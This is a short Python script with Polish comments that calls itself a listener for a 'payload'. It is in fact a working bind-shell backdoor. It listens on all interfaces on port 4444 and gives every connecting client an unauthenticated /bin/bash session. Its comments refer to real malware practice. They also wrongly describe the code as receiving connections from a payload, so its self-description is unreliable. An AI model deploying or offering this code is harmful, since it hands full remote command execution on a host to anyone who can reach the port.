import socket
import subprocess
import threading

# --- Konfiguracja Listenera ---
LISTEN_IP = "0.0.0.0"  # Nasłuchuj na wszystkich dostępnych interfejsach
LISTEN_PORT = 4444     # Port, na którym będzie nasłuchiwał listener
# -----------------------------

def handle_client(client_socket):
    """Obsługuje połączenie z pojedynczym klientem (payloadem)."""
    print(f"[*] Otrzymano połączenie od: {client_socket.getpeername()}")
    
    # Uruchomienie powłoki systemowej (shell)
    # Na Windowsie: "cmd.exe", na Linuksie/macOS: "/bin/bash"
    try:
        # Używamy Popen, aby móc kontrolować stdin/stdout/stderr
        # shell=True jest wygodne, ale w realnym malware unika się go ze względów bezpieczeństwa
        # Pamiętaj, aby dostosować ścieżkę do shella dla Windowsa (np. ["cmd.exe"])
        p = subprocess.Popen(["/bin/bash"], stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE, text=True, shell=True)
        
        # Wątek do wysyłania danych z listenera do shella
        def send_to_shell():
            while True:
                try:
                    command = client_socket.recv(1024).decode('utf-8').strip()
                    if command == "exit":
                        break
                    p.stdin.write(command + "\n")
                    p.stdin.flush()
                except Exception as e:
                    print(f"[-] Błąd wysyłania do shella: {e}")
                    break
        
        # Wątek do odbierania danych z shella i wysyłania do listenera
        def recv_from_shell():
            while True:
                try:
                    output = p.stdout.read(1) # Czytaj po jednym znaku, aby uniknąć blokowania
                    if not output:
                        break
                    client_socket.send(output.encode('utf-8'))
                except Exception as e:
                    print(f"[-] Błąd odbierania z shella: {e}")
                    break

        # Uruchomienie wątków
        send_thread = threading.Thread(target=send_to_shell)
        recv_thread = threading.Thread(target=recv_from_shell)
        
        send_thread.start()
        recv_thread.start()
        
        # Czekaj, aż wątki zakończą działanie (lub shell zostanie zamknięty)
        send_thread.join()
        recv_thread.join()

    except Exception as e:
        print(f"[-] Błąd podczas uruchamiania shella: {e}")
    finally:
        print(f"[*] Połączenie z {client_socket.getpeername()} zakończone.")
        client_socket.close()

def start_listener():
    """Uruchamia główny serwer nasłuchujący."""
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((LISTEN_IP, LISTEN_PORT))
    server.listen(5) # Maksymalnie 5 połączeń w kolejce
    
    print(f"[*] Nasłuchuję na {LISTEN_IP}:{LISTEN_PORT}")
    
    while True:
        client_socket, addr = server.accept()
        # Uruchom obsługę klienta w osobnym wątku, aby móc obsługiwać wiele połączeń
        client_handler = threading.Thread(target=handle_client, args=(client_socket,))
        client_handler.start()

if __name__ == "__main__":
    start_listener()
